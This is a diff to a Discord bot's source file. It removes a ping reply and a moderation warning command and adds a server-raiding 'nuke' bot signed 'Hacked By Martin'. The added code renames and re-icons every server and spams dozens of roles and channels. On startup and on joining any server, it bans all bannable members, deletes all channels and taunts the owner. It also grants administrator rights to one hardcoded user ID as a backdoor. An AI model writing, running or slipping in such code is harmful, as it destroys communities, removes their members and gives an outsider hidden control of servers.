@@ -5,51 +5,490 @@ const request = require('request');
 const jimp = require('jimp');
 const Canvas = require('canvas');
 const fs = require("fs");
-const prefix = "-"
 
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
 
-client.on('ready', () => {
-  console.log(`Logged in as ${client.user.tag}!`);
 });
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : MARTIN ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
-client.on('message', msg => {
-  if (msg.content === 'ping') {
-    msg.reply('Pong!');
+        
+    
+
+});
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
   }
 });
 
-  
-client.on('message', message => {
-    var p = message.mentions.members.first();
-    var reason = message.content.split(" ").slice(2).join(' ');
-    var log = message.guild.channels.find('name', 'log');
-    if(message.content.startsWith(`${prefix}تحذير`)){
-        if(!p) return message.reply(`**منشن العضو!**`);
-        if(!reason) return message.reply(`**اختار السبب من 1 الي 9**`);
-        if(!p.bannable) return message.reply(`**هذا العضو من فريق الادارة**`);
-        reason = reason.replace('0', "**نشر في الخاص**");
-        reason = reason.replace('1', "**اسم غير لائق**");
-        reason = reason.replace('2', "**صوره غير لائقه**");
-        reason = reason.replace('3', "**سب الاهل**");
-        reason = reason.replace('4', "**سب الذات الاهيه**");
-        reason = reason.replace('5', "**مخالفه القوانين مع اخذ اكثر من تحذير**");
-        reason = reason.replace('6', "**سبام في الشات**");
-        reason = reason.replace('7', "**استخدام بعض الاوامر بشكل مسبب للإضرار بالسيرفر**");
-        reason = reason.replace('8', "**جلب اعضاء مفبركين للسيرفر**");
-        reason = reason.replace('9', "**عنصريه**");
-        var embed = new Discord.RichEmbed()
-        .setAuthor(`User Warned!`)
-        .addField(`Name ♣`, `<@${p.id}>`)
-        .addField(`By ♣`, `<@${message.author.id}>`)
-        .addField(`Reason ♣`, reason)
-        .setTimestamp()
-        .setColor("WHITE")
-        .setFooter(` `)
-        message.channel.send(`${p} ${reason}`)
-            message.delete();
-        log.send({embed});
-    }
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+
+}
 });
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setUsername("Hacked By Martin :)")
+
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setGame(`Hacked By Martin :)`,'https://www.twitch.tv/hix')
+
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked By Martin :)`)
+})
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+
+}
+});
+
+LOka.on('message', message => {
+     
+
+     if (message.content === "k1") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By Martin :)",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+
+    
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+
+m.createChannel('Hacked By Martin :)', 'text');
+
+m.createChannel('Hacked By Martin :)', 'text');
+
+m.createChannel('Hacked By Martin :)', 'text');
+
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+
+m.createChannel('Hacked By Martin :)', 'text');
+m.createChannel('Hacked By Martin :)', 'text');
+
+})
+}
+});
+
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+m.createChannel('Hacked By Martin :)', 'voice');
+
+
+
+})
+}
+
+});
+
+
+const { Client } = require('discord.js');
+const client = new Client();
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked By Martin :)    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+  
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+  
+    await guild.createChannel('Hacked By Martin :)', 'text');
+
+      await guild.createChannel('Hacked By Martin :)', 'voice');
+
+  
+
+}
+
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by YzhF1");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
+
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+LOka.on('guildMemberAdd', member => {
+    
+            if (member.id === "349288766302584832") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM", 
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+                
+            }
+        
+    });
+
+    
+
+
+
+
+
+
+
 
 
   client.login(process.env.BOT_TOKEN);
